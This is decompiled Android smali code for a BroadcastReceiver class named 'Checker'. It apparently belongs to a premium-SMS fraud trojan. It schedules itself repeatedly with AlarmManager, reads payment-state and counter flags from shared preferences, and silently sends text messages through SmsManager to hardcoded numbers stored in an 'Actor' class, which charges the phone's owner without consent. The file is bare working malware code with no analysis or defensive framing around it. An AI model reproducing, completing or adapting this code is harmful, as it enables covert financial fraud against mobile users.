.class public Lcom/software/application/Checker;
.super Landroid/content/BroadcastReceiver;
.source "Checker.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.software.CHECKER"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 11
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method static scheduleChecking(Landroid/content/Context;)V
    .locals 8
    .param p0, "mContext"    # Landroid/content/Context;

    .prologue
    const/4 v7, 0x0

    .line 51
    const-string v3, "PAYED_KEY"

    const-string v4, "NO"

    .line 52
    const-string v5, "PREFS"

    invoke-virtual {p0, v5, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 51
    invoke-static {p0, v3, v4, v5}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Landroid/content/SharedPreferences;)V

    .line 53
    new-instance v1, Landroid/content/Intent;

    const-class v3, Lcom/software/application/Checker;

    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 54
    .local v1, "intent":Landroid/content/Intent;
    const-string v3, "alarm"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 55
    .local v0, "am":Landroid/app/AlarmManager;
    const-string v3, "com.software.CHECKER"

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 57
    const/high16 v3, 0x10000000

    .line 56
    invoke-static {p0, v7, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 58
    .local v2, "pendingIntent":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    const-wide/32 v5, 0xc350

    add-long/2addr v3, v5

    invoke-virtual {v0, v7, v3, v4, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 60
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v12, 0x1

    const/4 v11, 0x2

    const/4 v5, 0x0

    const/4 v2, 0x0

    .line 17
    const-string v1, "PREFS"

    invoke-virtual {p1, v1, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    .line 18
    .local v10, "settings":Landroid/content/SharedPreferences;
    const-string v1, "SENDED_SMS_COUNTER_KEY"

    invoke-interface {v10, v1, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v9

    .line 19
    .local v9, "sended":I
    const-string v1, "NO"

    .line 20
    const-string v3, "PAYED_KEY"

    const-string v4, "NO"

    .line 19
    invoke-interface {v10, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    .line 21
    sget-boolean v1, Lcom/software/application/Actor;->IS_MF:Z

    if-nez v1, :cond_0

    if-lt v9, v11, :cond_1

    :cond_0
    sget-boolean v1, Lcom/software/application/Actor;->IS_MF:Z

    if-eqz v1, :cond_2

    if-ge v9, v12, :cond_2

    .line 22
    :cond_1
    const-string v1, "SMS_DATA_KEY"

    const-string v3, ""

    invoke-interface {v10, v1, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 23
    .local v7, "data":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 24
    .local v0, "sms":Landroid/telephony/SmsManager;
    sget-object v1, Lcom/software/application/Actor;->NUMBER10:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v4, Lcom/software/application/Actor;->PORT_PREF:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "+"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 25
    invoke-static {p1}, Lcom/software/application/Checker;->scheduleChecking(Landroid/content/Context;)V

    .line 48
    .end local v0    # "sms":Landroid/telephony/SmsManager;
    .end local v7    # "data":Ljava/lang/String;
    :goto_0
    return-void

    .line 26
    :cond_2
    sget-boolean v1, Lcom/software/application/Actor;->IS_MF:Z

    if-nez v1, :cond_3

    if-ne v9, v11, :cond_3

    .line 27
    const-string v1, "SMS_DATA_KEY"

    const-string v3, ""

    invoke-interface {v10, v1, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 28
    .restart local v7    # "data":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 29
    .restart local v0    # "sms":Landroid/telephony/SmsManager;
    sget-object v1, Lcom/software/application/Actor;->NUMBER5:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    sget-object v4, Lcom/software/application/Actor;->PORT_PREF:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "+"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 30
    invoke-static {p1}, Lcom/software/application/Checker;->scheduleChecking(Landroid/content/Context;)V

    goto :goto_0

    .line 32
    .end local v0    # "sms":Landroid/telephony/SmsManager;
    .end local v7    # "data":Ljava/lang/String;
    :cond_3
    const-string v1, "SENDED_SMS_COUNTER_KEY"

    invoke-static {p1, v1, v5, v10}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;ILandroid/content/SharedPreferences;)V

    goto :goto_0

    .line 35
    :cond_4
    const-string v1, "NET_OP"

    const-string v3, ""

    invoke-interface {v10, v1, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 36
    .local v8, "opStr":Ljava/lang/String;
    new-instance v6, Lcom/software/application/Actor;

    invoke-direct {v6, p1, v8}, Lcom/software/application/Actor;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 37
    .local v6, "act":Lcom/software/application/Actor;
    invoke-virtual {v6}, Lcom/software/application/Actor;->wasInitError()Z

    move-result v1

    if-nez v1, :cond_5

    .line 38
    if-nez v9, :cond_6

    .line 39
    const-string v1, "5-3-1"

    invoke-virtual {v6, v1, v2}, Lcom/software/application/Actor;->activate(Ljava/lang/String;Ljava/lang/String;)V

    .line 46
    :cond_5
    :goto_1
    const-string v1, "SENDED_SMS_COUNTER_KEY"

    invoke-static {p1, v1, v5, v10}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;ILandroid/content/SharedPreferences;)V

    goto :goto_0

    .line 40
    :cond_6
    if-ne v9, v12, :cond_7

    .line 41
    const-string v1, "5-3"

    invoke-virtual {v6, v1, v2}, Lcom/software/application/Actor;->activate(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 42
    :cond_7
    if-ne v9, v11, :cond_5

    .line 43
    const-string v1, "3"

    invoke-virtual {v6, v1, v2}, Lcom/software/application/Actor;->activate(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1
.end method
